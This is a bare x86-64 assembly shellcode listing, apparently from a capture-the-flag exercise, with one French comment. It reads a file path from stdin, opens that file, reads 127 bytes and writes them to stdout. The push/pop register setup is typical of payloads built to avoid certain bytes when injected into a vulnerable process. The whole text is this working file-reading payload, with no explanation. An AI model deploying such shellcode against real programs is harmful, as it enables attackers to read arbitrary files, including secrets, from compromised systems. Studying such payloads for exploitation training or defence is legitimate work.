bits 64

push byte 0
pop rbx
push rbx
pop rax
push rbx
pop rdi
push rsp
pop rsi

push byte 25 ; taille à lire
pop rdx
syscall

push rbx
pop rax
xor al, 2
push rdi
push rsi
pop rdi
pop rsi
syscall

push rax
push rsi
push rdi
pop rsi
pop rax
pop rdi
push byte 127
pop rdx
syscall

push rbx
pop rax
xor al, 1
push rax
pop rdi
syscall
ret